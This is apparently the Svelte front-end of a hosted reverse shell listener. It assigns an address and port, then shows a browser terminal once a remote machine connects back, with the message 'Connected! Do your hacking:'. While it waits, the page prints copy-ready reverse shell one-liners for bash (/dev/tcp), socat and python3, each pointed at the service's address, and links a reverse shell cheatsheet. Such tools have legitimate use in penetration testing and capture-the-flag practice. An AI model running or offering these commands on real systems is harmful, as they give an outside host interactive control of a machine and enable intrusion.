<script lang="ts">
  import { io } from "socket.io-client";
  import { Terminal } from "xterm";
  import { FitAddon } from "xterm-addon-fit";
  import * as uuid from "uuid";
  import { tick } from "svelte";

  const PRODUCTION = import.meta.env.PROD;
  const SOCKET_IO_URL = PRODUCTION
    ? "https://api.rs.tyilo.com/"
    : "http://localhost:4000/";

  type Config = {
    address: string;
    port: number;
  };

  enum State {
    WaitingForSocketIO,
    WaitingForConfig,
    WaitingForReverseShell,
    Connected,
    Disconnected,
    ShellConnectTimeout,
  }

  let state = State.WaitingForSocketIO;

  let terminalElement: HTMLElement = null;

  const term = new Terminal();
  const fitAddon = new FitAddon();
  term.loadAddon(fitAddon);

  async function initTerm() {
    await tick();
    term.open(terminalElement);
    fitAddon.fit();
    window.addEventListener("resize", () => {
      fitAddon.fit();
    });
    term.onData((c) => {
      socket.emit("char", c);
    });
  }

  let id = window.location.hash.substr(1);
  if (!uuid.validate(id)) {
    id = uuid.v4();
  }

  $: window.location.hash = `#${id}`;

  const socket = io(SOCKET_IO_URL, {
    query: {
      id: id,
    },
  });
  socket.on("connect", () => {
    state = State.WaitingForConfig;
  });

  let config: Config;
  socket.on("config", (newConfig: Config) => {
    config = newConfig;
    if (state === State.WaitingForConfig) {
      state = State.WaitingForReverseShell;
    }
  });

  socket.on("shellConnected", () => {
    state = State.Connected;
    initTerm();
  });

  socket.on("shellData", (data) => {
    term.write(new Uint8Array(data));
  });

  socket.on("shellDisconnected", () => {
    state = State.Disconnected;
  });

  socket.on("shellConnectTimeout", () => {
    state = State.ShellConnectTimeout;
  });

  function newConnection() {
    window.location.hash = "";
    window.location.reload();
  }

  let showNewConnection: boolean;
  $: showNewConnection =
    state === State.Disconnected || state === State.ShellConnectTimeout;

  let showTerminal: boolean;
  $: showTerminal = state === State.Connected || showNewConnection;
</script>

<main>
  <div id="header">
    {#if state === State.WaitingForSocketIO}
      <h1>Connecting to server...</h1>
    {:else if state === State.WaitingForConfig}
      <h1>Finding available port...</h1>
    {:else if state === State.WaitingForReverseShell}
      <h1>Connect your reverse shell to {config.address}:{config.port}</h1>
    {:else if state === State.Connected}
      <h1>Connected! Do your hacking:</h1>
    {:else if state === State.Disconnected}
      <h1>TCP socket disconnected!</h1>
    {:else if state === State.ShellConnectTimeout}
      <h1>Timed out waiting for reverse shell!</h1>
    {/if}
    {#if showNewConnection}
      <button type="button" id="new-connection-button" on:click={newConnection}
        >New connection</button
      >
    {/if}
  </div>
  <div id="content">
    {#if state === State.WaitingForReverseShell}
      <div id="reverse-shells">
        See <a
          href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"
          >Payloads All The Things Reverse Shell Cheatsheet</a
        >
        for more.

        <h2>bash</h2>
        <pre>/bin/bash -li >& /dev/tcp/{config.address}:{config.port} 0>&1</pre>

        <h2>socat</h2>
        <pre>socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{config.address}:{config.port}</pre>

        <h2>python 3</h2>
        <pre>python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{config.address}",{config.port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'</pre>
      </div>
    {/if}
    {#if showTerminal}
      <div id="terminal" bind:this={terminalElement} />
    {/if}
  </div>
</main>

<style>
  @import "../node_modules/xterm/css/xterm.css";

  :global(html),
  :global(body),
  :global(#app) {
    height: 100%;
    margin: 0;
    background-color: #222;
    color: #ddd;
  }

  a {
    color: yellow;
  }

  :root {
    height: 100%;
  }

  main {
    height: 100%;
    margin-left: 1em;
    margin-right: 1em;
    display: grid;
    grid-template:
      "header" 5em
      "content" 1fr
      "nothing" 1em;
  }

  #header {
    grid-area: header;
  }

  #header h1 {
    display: inline-block;
  }

  #terminal > :global(div) {
    grid-area: terminal;
    border: solid 1px gray;
  }

  #new-connection-button {
    font-size: 1.5em;
    margin-left: 3em;
  }

  #reverse-shells {
    white-space: pre-line;
  }

  pre {
    display: inline-block;
    background-color: black;
    padding: 0.5em;
    user-select: all;
  }
</style>
